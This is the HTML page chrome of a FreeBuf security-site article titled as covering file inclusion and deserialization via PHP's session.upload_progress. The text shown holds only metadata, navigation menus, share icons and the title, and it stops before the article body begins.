<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<!doctype html>
<html data-n-head-ssr>

<head>
  <title>利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</title><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width,initial-scale=1"><meta data-n-head="ssr" name="renderer" content="webkit"><meta data-n-head="ssr" http-equiv="X-UA-Compatible" content="IE=edge"><meta data-n-head="ssr" name="baidu-site-verification" content="nKKKqQxp6R"><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width,inital-scal=1"><meta data-n-head="ssr" data-hid="description" name="description" content="本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。"><meta data-n-head="ssr" name="keywords" content="vuls,others-articles,session.upload_progress,反序列化渗透"><link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.freebuf.com/favicon.ico"><link data-n-head="ssr" rel="stylesheet" href="https://www.freebuf.com/style/editor.css"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.f2bddb9b2047fee49046.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.32658a830f395d50ed89.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.a53ea8b00779fcef0fe8.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.8c990f909effb6d618d3.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.e258e4cfb199b83189c6.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.19981de942074100ce9c.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.927944ae29787a1b414f.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.02cf93cfce14e2557064.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.d38dc245ca9b7dd8571d.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.e21c04f32fbd7819bb01.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.2ce4e8f001d4b2b67fbb.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.4a67fc481049623895c6.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.627b1661cc29c3e32429.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.7b5eb7ff4936b9e0c27a.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.9b4235960ae0c2cc9600.js" as="script"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.8c990f909effb6d618d3.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.19981de942074100ce9c.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.e21c04f32fbd7819bb01.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.4a67fc481049623895c6.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.7b5eb7ff4936b9e0c27a.css">
</head>

<body>
  <div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div id="components-layout-demo-basic" class="public-header-article" data-v-55d8de90><section class="ant-layout" data-v-55d8de90><header class="articles-layout-header ant-layout-header" style="position:fixed;z-index:51;width:100%" data-v-55d8de90><div class="content-header" data-v-55d8de90><a href="https://www.freebuf.com/" class="logo-view nuxt-link-active" data-v-c5f1b53a data-v-55d8de90><img src="https://www.freebuf.com/images/logoMax.png" alt="freeBuf" style="color:#fff" data-v-c5f1b53a></a> <div class="main-view" data-v-6072cd9c data-v-55d8de90><div class="main-but" data-v-6072cd9c><span style="font-size:14px;display:inline-block;white-space:nowrap;letter-spacing:1px" data-v-6072cd9c>主站</span> <svg aria-hidden="true" class="svg-icon main-slider-cion" style="margin-left:3px" data-v-322983b7 data-v-6072cd9c><use xlink:href="#caret-down" data-v-322983b7></use></svg> <div class="main-but-view" data-v-6072cd9c><div data-v-6072cd9c><div class="tag-top" data-v-6072cd9c><p data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#heike" data-v-322983b7></use></svg><span data-v-6072cd9c>分类</span></p> <div class="tag-top-bottom" data-v-6072cd9c><span class="border-none nuxt-link-active" data-v-6072cd9c>
              漏洞
            </span> <span data-v-6072cd9c>
              工具
            </span> <span data-v-6072cd9c>
              极客
            </span> <span data-v-6072cd9c>
              Web安全
            </span> <span data-v-6072cd9c>
              系统安全
            </span> <span data-v-6072cd9c>
              网络安全
            </span> <span data-v-6072cd9c>
              无线安全
            </span> <span class="border-none" data-v-6072cd9c>
              设备/客户端安全
            </span> <span data-v-6072cd9c>
              数据安全
            </span> <span data-v-6072cd9c>
              安全管理
            </span> <span data-v-6072cd9c>
              企业安全
            </span> <span data-v-6072cd9c>
              工控安全
            </span></div></div> <div class="tag-top" style="margin-top:10px" data-v-6072cd9c><p data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#eye-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>特色</span></p> <div class="tag-top-bottom" data-v-6072cd9c><span class="border-none" data-v-6072cd9c>
              头条
            </span> <span data-v-6072cd9c>
              人物志
            </span> <span data-v-6072cd9c>
              活动
            </span> <span data-v-6072cd9c>
              视频
            </span> <span data-v-6072cd9c>
              观点
            </span> <span data-v-6072cd9c>
              招聘
            </span> <span data-v-6072cd9c>
              报告
            </span> <span data-v-6072cd9c>
              资讯
            </span> <span class="border-none" data-v-6072cd9c>
              区块链安全
            </span> <span data-v-6072cd9c>
              标准与合规
            </span> <span data-v-6072cd9c>
              容器安全
            </span> <span data-v-6072cd9c>
              公开课
            </span></div></div></div> <div class="tag-bottom" data-v-6072cd9c><a href="https://www.freebuf.com/report" target="_blank" class="left-slider-but" data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#file-text-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>报告</span></a> <div role="separator" class="ant-divider ant-divider-vertical" style="margin:0 30px;background:#3a3a3a" data-v-6072cd9c></div> <a href="https://www.freebuf.com/column" data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#folder-open-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>专辑</span></a></div></div></div></div> <div class="menu-view" data-v-377c74a3 data-v-55d8de90><ul role="menu" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-dark" data-v-377c74a3><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item" data-v-377c74a3><a href="https://live.freebuf.com" target="_blank" data-v-377c74a3>公开课</a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item" data-v-377c74a3><a href="https://shop.freebuf.com" target="_blank" data-v-377c74a3>商城</a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="menu-item-self ant-menu-submenu ant-menu-submenu-horizontal" data-v-377c74a3><div aria-haspopup="true" class="ant-menu-submenu-title"><span class="submenu-title-wrapper" data-v-377c74a3>
						用户服务
						<svg aria-hidden="true" class="svg-icon home-menu" data-v-322983b7 data-v-377c74a3><use xlink:href="#caret-down" data-v-322983b7></use></svg></span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <div class="feature-column-container" data-v-05e06156 data-v-377c74a3><span class="feature-column-item" data-v-05e06156>行业服务
    <svg aria-hidden="true" class="svg-icon home-menu" data-v-322983b7 data-v-05e06156><use xlink:href="#caret-down" data-v-322983b7></use></svg></span> <div class="feature-column-menu" data-v-05e06156><div class="feature-column" data-v-05e06156><span data-v-05e06156><svg aria-hidden="true" class="svg-icon zhengfu" data-v-322983b7 data-v-05e06156><use xlink:href="#zhengfu" data-v-322983b7></use></svg>
        政 府
      </span> <div data-v-05e06156><span data-v-05e06156>
          CNCERT
          <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
          CNNVD
          <!----></span></div></div> <div class="company-rewrite" data-v-05e06156><span data-v-05e06156>
        会员体系（甲方）
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        会员体系（厂商）
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        产品名录
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        企业空间
        <!----></span></div></div></div> <span class="wikibtn" data-v-377c74a3><a href="https://wiki.freebuf.com/page" target="_blank" data-v-377c74a3>知识大陆</a></span></div> <div class="user-view" data-v-55d8de90><div class="search-cloud"><i aria-label="icon: search" class="anticon anticon-search" style="color:rgba(255,255,255,.6)"><svg viewBox="64 64 896 896" focusable="false" data-icon="search" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0 0 11.6 0l43.6-43.5a8.2 8.2 0 0 0 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"></path></svg></i> <span class="ant-input-search ant-input-search-enter-button ant-input-group-wrapper"><span class="ant-input-wrapper ant-input-group"><input placeholder="搜索关键词..." class="ant-input"><span class="ant-input-group-addon"><button type="button" class="ant-btn ant-input-search-button"><span>搜索</span></button></span></span></span></div> <div class="guide-write-wrap"><button type="button" class="write-btn ant-btn ant-btn-primary ant-dropdown-trigger"><span>创作中心</span></button> <!----></div> <div class="tool-but-view album-square ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#album-square-hover" data-v-322983b7></use></svg></div> <div class="tool-but-view album-square ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#load-app" data-v-322983b7></use></svg></div> <div class="tool-but-view ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#calendar" data-v-322983b7></use></svg></div> <div class="tool-but-view ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#tool" data-v-322983b7></use></svg></div> <button type="button" class="login-register ant-btn ant-btn-primary"><a href="https://www.freebuf.com/oauth" class="login-but login-btn">登录</a><a href="https://account.tophant.com/register" class="login-but">注册</a></button></div></div></header> <main class="content-body ant-layout-content" style="padding:20px 0;margin-top:55px" data-v-55d8de90><div id="artical-detail-page" data-v-81187e68 data-v-55d8de90 data-v-55d8de90><div class="floating-view" data-v-a4133620 data-v-81187e68><!----> <div class="floating-view-item qianbao" data-v-a4133620></div> <div class="floating-view-item" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#edit1" data-v-322983b7></use></svg></div> <div class="floating-view-item qrcode-box" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#qrcode" data-v-322983b7></use></svg> <div class="qrcode-list" data-v-a4133620><div class="tab-view" data-v-a4133620><p data-v-a4133620><span class="active" data-v-a4133620>官方公众号</span><span data-v-a4133620>企业安全</span><span data-v-a4133620>新浪微博</span></p> <div class="qrcode-view" data-v-a4133620><img src="https://www.freebuf.com/images/gzh_code.jpg" alt data-v-a4133620> <p data-v-a4133620>FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。</p></div></div> <div class="sanjiao-view" data-v-a4133620></div></div></div> <div class="floating-view-item qrcode-xcx" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#erweima" data-v-322983b7></use></svg> <div class="qrcode-list" data-v-a4133620><div class="tab-view" data-v-a4133620><div class="qrcode-view xcx-box" data-v-a4133620><img src="https://www.freebuf.com/images/xcx-code.jpg" alt="FreeBuf+小程序" style="color:#fff" data-v-a4133620> <p class="xcx-wiew" data-v-a4133620><span data-v-a4133620>FreeBuf+小程序</span><label data-v-a4133620>把安全装进口袋</label></p></div></div> <div class="sanjiao-view" data-v-a4133620></div></div></div> <div class="floating-view-item qrcode-xcx" data-v-a4133620><a href="https://wiki.freebuf.com/page" target="_blank" data-v-a4133620><svg aria-hidden="true" class="svg-icon" style="font-size:17px" data-v-322983b7 data-v-a4133620><use xlink:href="#wiki_tip" data-v-322983b7></use></svg></a></div> <div style="width:40px;height:40px" data-v-a4133620><!----></div> <!----> <!----> <!----></div> <div class="page-header" data-v-81187e68><div class="header-container" data-v-81187e68><div class="page-head-wrapper" data-v-81187e68><div class="title" data-v-81187e68>利用session.upload_progress进行文件包含和反序列化渗透</div> <ul class="wrpper" data-v-81187e68><li class="auth" data-v-81187e68><a href="" data-v-81187e68><span class="img" data-v-81187e68><img src="" data-v-81187e68></span> <span class="name" data-v-81187e68></span></a></li> <li class="collet" data-v-81187e68><span class="focus" data-v-81187e68>
								关注
							</span></li> <!----></ul></div></div></div> <div class="container" data-v-81187e68><div class="aside-left" data-v-81187e68><div class="aside-left-wrapper" data-v-81187e68><ul class="tabs-panel" data-v-81187e68><li class="tab active" data-v-81187e68><a href="https://www.freebuf.com/vuls" target="_blank" data-v-81187e68>漏洞</a></li><li class="tab" data-v-81187e68><a href="https://www.freebuf.com/articles/others-articles" target="_blank" data-v-81187e68>其他</a></li></ul> <div class="approve-panel" data-v-81187e68><div class="approve" data-v-81187e68><div data-v-81187e68><span class="ant-badge" data-v-81187e68><i aria-label="图标: like" class="anticon anticon-like" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="like" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M885.9 533.7c16.8-22.2 26.1-49.4 26.1-77.7 0-44.9-25.1-87.4-65.5-111.1a67.67 67.67 0 0 0-34.3-9.3H572.4l6-122.9c1.4-29.7-9.1-57.9-29.5-79.4A106.62 106.62 0 0 0 471 99.9c-52 0-98 35-111.8 85.1l-85.9 311H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h601.3c9.2 0 18.2-1.8 26.5-5.4 47.6-20.3 78.3-66.8 78.3-118.4 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7-.2-12.6-2-25.1-5.6-37.1zM184 852V568h81v284h-81zm636.4-353l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 22.4-13.2 42.6-33.6 51.8H329V564.8l99.5-360.5a44.1 44.1 0 0 1 42.2-32.3c7.6 0 15.1 2.2 21.1 6.7 9.9 7.4 15.2 18.6 14.6 30.5l-9.6 198.4h314.4C829 418.5 840 436.9 840 456c0 16.5-7.2 32.1-19.6 43z"></path></svg></i><!----></span></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68><span class="ant-badge" data-v-81187e68><i aria-label="图标: message" class="anticon anticon-message" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="message" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M464 512a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm200 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm-400 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm661.2-173.6c-22.6-53.7-55-101.9-96.3-143.3a444.35 444.35 0 0 0-143.3-96.3C630.6 75.7 572.2 64 512 64h-2c-60.6.3-119.3 12.3-174.5 35.9a445.35 445.35 0 0 0-142 96.5c-40.9 41.3-73 89.3-95.2 142.8-23 55.4-34.6 114.3-34.3 174.9A449.4 449.4 0 0 0 112 714v152a46 46 0 0 0 46 46h152.1A449.4 449.4 0 0 0 510 960h2.1c59.9 0 118-11.6 172.7-34.3a444.48 444.48 0 0 0 142.8-95.2c41.3-40.9 73.8-88.7 96.5-142 23.6-55.2 35.6-113.9 35.9-174.5.3-60.9-11.5-120-34.8-175.6zm-151.1 438C704 845.8 611 884 512 884h-1.7c-60.3-.3-120.2-15.3-173.1-43.5l-8.4-4.5H188V695.2l-4.5-8.4C155.3 633.9 140.3 574 140 513.7c-.4-99.7 37.7-193.3 107.6-263.8 69.8-70.5 163.1-109.5 262.8-109.9h1.7c50 0 98.5 9.7 144.2 28.9 44.6 18.7 84.6 45.6 119 80 34.3 34.3 61.3 74.4 80 119 19.4 46.2 29.1 95.2 28.9 145.8-.6 99.6-39.7 192.9-110.1 262.7z"></path></svg></i><!----></span></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68 data-v-81187e68><i aria-label="图标: star" class="anticon anticon-star" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="star" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M908.1 353.1l-253.9-36.9L540.7 86.1c-3.1-6.3-8.2-11.4-14.5-14.5-15.8-7.8-35-1.3-42.9 14.5L369.8 316.2l-253.9 36.9c-7 1-13.4 4.3-18.3 9.3a32.05 32.05 0 0 0 .6 45.3l183.7 179.1-43.4 252.9a31.95 31.95 0 0 0 46.4 33.7L512 754l227.1 119.4c6.2 3.3 13.4 4.4 20.3 3.2 17.4-3 29.1-19.5 26.1-36.9l-43.4-252.9 183.7-179.1c5-4.9 8.3-11.3 9.3-18.3 2.7-17.5-9.5-33.7-27-36.3zM664.8 561.6l36.1 210.3L512 672.7 323.1 772l36.1-210.3-152.8-149L417.6 382 512 190.7 606.4 382l211.2 30.7-152.8 148.9z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68 data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px" data-v-322983b7 data-v-81187e68><use xlink:href="#collect" data-v-322983b7></use></svg></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: share-alt" class="anticon anticon-share-alt" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="share-alt" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M752 664c-28.5 0-54.8 10-75.4 26.7L469.4 540.8a160.68 160.68 0 0 0 0-57.6l207.2-149.9C697.2 350 723.5 360 752 360c66.2 0 120-53.8 120-120s-53.8-120-120-120-120 53.8-120 120c0 11.6 1.6 22.7 4.7 33.3L439.9 415.8C410.7 377.1 364.3 352 312 352c-88.4 0-160 71.6-160 160s71.6 160 160 160c52.3 0 98.7-25.1 127.9-63.8l196.8 142.5c-3.1 10.6-4.7 21.8-4.7 33.3 0 66.2 53.8 120 120 120s120-53.8 120-120-53.8-120-120-120zm0-476c28.7 0 52 23.3 52 52s-23.3 52-52 52-52-23.3-52-52 23.3-52 52-52zM312 600c-48.5 0-88-39.5-88-88s39.5-88 88-88 88 39.5 88 88-39.5 88-88 88zm440 236c-28.7 0-52-23.3-52-52s23.3-52 52-52 52 23.3 52 52-23.3 52-52 52z"></path></svg></i></div></div> <div style="display:none" data-v-81187e68><div class="approve" data-v-81187e68 data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: wechat" class="anticon anticon-wechat" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="wechat" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M690.1 377.4c5.9 0 11.8.2 17.6.5-24.4-128.7-158.3-227.1-319.9-227.1C209 150.8 64 271.4 64 420.2c0 81.1 43.6 154.2 111.9 203.6a21.5 21.5 0 0 1 9.1 17.6c0 2.4-.5 4.6-1.1 6.9-5.5 20.3-14.2 52.8-14.6 54.3-.7 2.6-1.7 5.2-1.7 7.9 0 5.9 4.8 10.8 10.8 10.8 2.3 0 4.2-.9 6.2-2l70.9-40.9c5.3-3.1 11-5 17.2-5 3.2 0 6.4.5 9.5 1.4 33.1 9.5 68.8 14.8 105.7 14.8 6 0 11.9-.1 17.8-.4-7.1-21-10.9-43.1-10.9-66 0-135.8 132.2-245.8 295.3-245.8zm-194.3-86.5c23.8 0 43.2 19.3 43.2 43.1s-19.3 43.1-43.2 43.1c-23.8 0-43.2-19.3-43.2-43.1s19.4-43.1 43.2-43.1zm-215.9 86.2c-23.8 0-43.2-19.3-43.2-43.1s19.3-43.1 43.2-43.1 43.2 19.3 43.2 43.1-19.4 43.1-43.2 43.1zm586.8 415.6c56.9-41.2 93.2-102 93.2-169.7 0-124-120.8-224.5-269.9-224.5-149 0-269.9 100.5-269.9 224.5S540.9 847.5 690 847.5c30.8 0 60.6-4.4 88.1-12.3 2.6-.8 5.2-1.2 7.9-1.2 5.2 0 9.9 1.6 14.3 4.1l59.1 34c1.7 1 3.3 1.7 5.2 1.7a9 9 0 0 0 6.4-2.6 9 9 0 0 0 2.6-6.4c0-2.2-.9-4.4-1.4-6.6-.3-1.2-7.6-28.3-12.2-45.3-.5-1.9-.9-3.8-.9-5.7.1-5.9 3.1-11.2 7.6-14.5zM600.2 587.2c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9c0 19.8-16.2 35.9-36 35.9zm179.9 0c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9a36.08 36.08 0 0 1-36 35.9z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: weibo-circle" class="anticon anticon-weibo-circle" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="weibo-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm-44.4 672C353.1 736 236 680.4 236 588.9c0-47.8 30.2-103.1 82.3-155.3 69.5-69.6 150.6-101.4 181.1-70.8 13.5 13.5 14.8 36.8 6.1 64.6-4.5 14 13.1 6.3 13.1 6.3 56.2-23.6 105.2-25 123.1.7 9.6 13.7 8.6 32.8-.2 55.1-4.1 10.2 1.3 11.8 9 14.1 31.7 9.8 66.9 33.6 66.9 75.5.2 69.5-99.7 156.9-249.8 156.9zm207.3-290.8a34.9 34.9 0 0 0-7.2-34.1 34.68 34.68 0 0 0-33.1-10.7 18.24 18.24 0 0 1-7.6-35.7c24.1-5.1 50.1 2.3 67.7 21.9 17.7 19.6 22.4 46.3 14.9 69.8a18.13 18.13 0 0 1-22.9 11.7 18.18 18.18 0 0 1-11.8-22.9zm106 34.3s0 .1 0 0a21.1 21.1 0 0 1-26.6 13.7 21.19 21.19 0 0 1-13.6-26.7c11-34.2 4-73.2-21.7-101.8a104.04 104.04 0 0 0-98.9-32.1 21.14 21.14 0 0 1-25.1-16.3 21.07 21.07 0 0 1 16.2-25.1c49.4-10.5 102.8 4.8 139.1 45.1 36.3 40.2 46.1 95.1 30.6 143.2zm-334.5 6.1c-91.4 9-160.7 65.1-154.7 125.2 5.9 60.1 84.8 101.5 176.2 92.5 91.4-9.1 160.7-65.1 154.7-125.3-5.9-60.1-84.8-101.5-176.2-92.4zm80.2 141.7c-18.7 42.3-72.3 64.8-117.8 50.1-43.9-14.2-62.5-57.7-43.3-96.8 18.9-38.4 68-60.1 111.5-48.8 45 11.7 68 54.2 49.6 95.5zm-93-32.2c-14.2-5.9-32.4.2-41.2 13.9-8.8 13.8-4.7 30.2 9.3 36.6 14.3 6.5 33.2.3 42-13.8 8.8-14.3 4.2-30.6-10.1-36.7zm34.9-14.5c-5.4-2.2-12.2.5-15.4 5.8-3.1 5.4-1.4 11.5 4.1 13.8 5.5 2.3 12.6-.3 15.8-5.8 3-5.6 1-11.8-4.5-13.8z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: qq" class="anticon anticon-qq" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="qq" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M824.8 613.2c-16-51.4-34.4-94.6-62.7-165.3C766.5 262.2 689.3 112 511.5 112 331.7 112 256.2 265.2 261 447.9c-28.4 70.8-46.7 113.7-62.7 165.3-34 109.5-23 154.8-14.6 155.8 18 2.2 70.1-82.4 70.1-82.4 0 49 25.2 112.9 79.8 159-26.4 8.1-85.7 29.9-71.6 53.8 11.4 19.3 196.2 12.3 249.5 6.3 53.3 6 238.1 13 249.5-6.3 14.1-23.8-45.3-45.7-71.6-53.8 54.6-46.2 79.8-110.1 79.8-159 0 0 52.1 84.6 70.1 82.4 8.5-1.1 19.5-46.4-14.5-155.8z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: link" class="anticon anticon-link" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="link" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M574 665.4a8.03 8.03 0 0 0-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8a8.03 8.03 0 0 0-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zm258.6-474c-84.6-84.6-221.5-84.6-306 0L410.3 307.6a8.03 8.03 0 0 0 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6a8.03 8.03 0 0 0 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1zM610.1 372.3a8.03 8.03 0 0 0-11.3 0L372.3 598.7a8.03 8.03 0 0 0 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z"></path></svg></i></div></div></div></div></div></div> <div class="main" data-v-81187e68><div class="main-warpper" data-v-81187e68><div class="artical-header" data-v-81187e68><div class="title" data-v-81187e68><span class="title-span" data-v-81187e68>利用session.upload_progress进行文件包含和反序列化渗透</span> <!----> <!----> <!----> <div class="origin-reward" data-v-81187e68><!----> <span class="reward" data-v-81187e68></span></div></div> <div class="author-info" data-v-81187e68><a href="" class="author" data-v-81187e68><i aria-label="图标: user" class="anticon anticon-user" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="user" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M858.5 763.6a374 374 0 0 0-80.6-119.5 375.63 375.63 0 0 0-119.5-80.6c-.4-.2-.8-.3-1.2-.5C719.5 518 760 444.7 760 362c0-137-111-248-248-248S264 225 264 362c0 82.7 40.5 156 102.8 201.1-.4.2-.8.3-1.2.5-44.8 18.9-85 46-119.5 80.6a375.63 375.63 0 0 0-80.6 119.5A371.7 371.7 0 0 0 136 901.8a8 8 0 0 0 8 8.2h60c4.4 0 7.9-3.5 8-7.8 2-77.2 33-149.5 87.8-204.3 56.7-56.7 132-87.9 212.2-87.9s155.5 31.2 212.2 87.9C779 752.7 810 825 812 902.2c.1 4.4 3.6 7.8 8 7.8h60a8 8 0 0 0 8-8.2c-1-47.8-10.9-94.3-29.5-138.2zM512 534c-45.9 0-89.1-17.9-121.6-50.4S340 407.9 340 362c0-45.9 17.9-89.1 50.4-121.6S466.1 190 512 190s89.1 17.9 121.6 50.4S684 316.1 684 362c0 45.9-17.9 89.1-50.4 121.6S557.9 534 512 534z"></path></svg></i>
